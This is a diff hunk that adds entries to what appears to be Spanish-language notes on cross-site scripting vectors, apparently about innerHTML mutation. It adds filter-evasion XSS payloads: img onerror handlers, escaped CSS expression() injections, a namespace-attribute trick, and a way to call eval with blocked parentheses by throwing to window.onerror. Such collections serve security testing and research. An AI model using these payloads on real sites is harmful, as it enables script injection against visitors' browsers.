@@ -157,6 +157,32 @@ Es un vector que ocurre en el innerHTML y esta relacionado con las propiedades d
 <p/id=pID>Hi</p>
 <!-- Hi -->
 <div><code>Hi<h1>high</h1></code></div>
+
+<!--  -->
+<!--  -->
+<div><&lt;img src=1 onerror=alert(1)&gt;</div>
+
+<!--  -->
+<img srtle="font-fa\22onerror\3d\61lert\28\31\29\20mily:'arial'"src="x:x" />
+
+<!--  -->
+<p style="font-family:'ar&quot;;x=expression(alert(1))\*ial'"></p>
+
+<!--  -->
+<p style ="font-family:'ar\27\3bx\3aexpression\28\61lert\28\31\29\3bial'"></p>
+
+<!--  -->
+<article xmlns="urn:img src=x onerror=xss()//">
+
+
+<!-- Pasando parametros a funciones con el parentesis bloqueado -->
+
+<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
+<!-- onerror=alert;throw 1; -->
+
+<img src='x' onerror="window.onerror=eval;throw'\u003d&#x0061;&#x006C;ert&#x0028;1&#41;'">
+
+
 ```
 
 
